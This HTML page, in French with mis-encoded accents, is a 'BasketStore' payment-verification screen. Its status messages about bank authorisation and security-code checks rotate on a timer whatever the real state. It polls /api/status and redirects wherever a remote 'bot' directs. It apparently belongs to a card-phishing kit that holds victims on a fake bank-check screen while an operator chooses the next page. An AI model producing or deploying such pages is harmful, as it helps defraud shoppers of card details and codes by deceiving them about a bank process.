<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>V√©rification Paiement - BasketStore</title>
  <style>
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(135deg, #f9fafb, #e3e7eb);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      color: #333;
    }
    .spinner {
      border: 10px solid #e0e0e0;
      border-top: 10px solid #007bff;
      border-radius: 50%;
      width: 100px;
      height: 100px;
      animation: spin 1.2s linear infinite;
      margin-bottom: 30px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    h1 {
      font-size: 1.8em;
      margin-bottom: 10px;
    }
    #statusText {
      font-size: 1.1em;
      color: #555;
      margin-top: 10px;
    }
    small {
      color: #888;
      display: block;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <h1>üí≥ V√©rification du paiement en cours...</h1>
  <div class="spinner"></div>
  <p id="statusText">Autorisation de la banque en cours...</p>
  <small>(Ne fermez pas cette page)</small>

  <script>
    // ‚ú® Animation texte dynamique
    const messages = [
      "‚è≥ Autorisation de la banque en cours...",
      "üîí V√©rification du code de s√©curit√©...",
      "üè¶ Communication avec votre banque...",
      "üí¨ En attente de validation...",
      "‚úÖ Traitement en cours..."
    ];
    let i = 0;
    setInterval(() => {
      i = (i + 1) % messages.length;
      document.getElementById('statusText').textContent = messages[i];
    }, 2500);

    // üîÅ V√©rifie redirection du bot (paiement accept√©, etc.)
    let checking = false, lastRedirect = null;
    async function checkStatus() {
      if (checking) return;
      checking = true;
      try {
        const res = await fetch('/api/status', { cache: 'no-store' });
        const data = await res.json();
        if (data.redirect && data.redirect !== lastRedirect) {
          lastRedirect = data.redirect;
          window.location.href = data.redirect;
          return;
        }
      } catch (e) {
        console.warn("Erreur checkStatus:", e);
      } finally {
        checking = false;
        setTimeout(checkStatus, 2000);
      }
    }

    checkStatus();
  </script>
</body>
</html>
